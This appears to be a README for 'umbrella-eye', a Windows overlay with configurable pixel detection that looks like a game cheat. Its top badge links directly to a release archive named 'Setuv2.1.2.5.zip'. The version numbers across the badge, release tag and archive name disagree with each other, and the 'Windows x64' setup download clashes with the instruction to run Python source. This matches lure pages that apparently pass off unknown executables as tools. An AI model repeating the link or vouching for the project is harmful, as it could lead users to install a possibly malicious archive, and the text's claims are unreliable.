[![Download](https://img.shields.io/badge/Download-Windows%20x64-0078D6?style=for-the-badge&logo=windows)](https://github.com/alexp-ops92c4/umbrella-eye/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 🎮 umbrella-eye

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.1-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/alexp-ops92c4/umbrella-eye?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/alexp-ops92c4/umbrella-eye?style=flat-square)

Umbrella UI: real-time stats, themes, configurable options

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## Requirements

Make sure you've got Python 3.11 or higher installed. You'll also need to install the required packages. Just run:

```bash
pip install -r requirements.txt
```

This will install all the necessary dependencies, like `PyYAML` and `Pillow`.

## Usage

To start the app, simply run:

```bash
python main.py
```

It'll load the configuration from `config.yaml`. You can modify this file to change settings.

## Config

The `config.yaml` file lets you adjust all sorts of things. Here's an example:

```yaml
overlay:
 enabled: true
 color: "red"
 opacity: 0.7
 font_size: 16
monitor:
 refresh_rate: 60
 target_area:
 top: 100
 left: 100
 width: 800
 height: 600
hotkeys:
 toggle_overlay: "F9"
pixel_detection:
 enabled: true
 pixel_color: "#FFA500" # Orange
 threshold: 10
```

You can tweak overlay colors, refresh rates, hotkeys, and pixel detection settings. Don't forget to restart the app after making changes to the config file.

## FAQ

<details>
 <summary>Why isn't the overlay showing up?</summary>
 Make sure `overlay.enabled` is set to `true` in your `config.yaml`. Also, check your monitor resolution and adjust the `target_area` settings.
</details>

<details>
 <summary>How do I change the hotkeys?</summary>
 Edit the `hotkeys` section in `config.yaml`. Make sure the hotkey names are valid (e.g., "F9", "Ctrl+Shift+A").
</details>

<details>
 <summary>The pixel detection is inaccurate. What can I do?</summary>
 Adjust the `threshold` value in the `pixel_detection` section. Lower values make pixel detection more sensitive. Also, ensure that the `pixel_color` is correctly specified in hex format (e.g., "#RRGGBB").
</details>

---

🛠 Built with Python | Open Source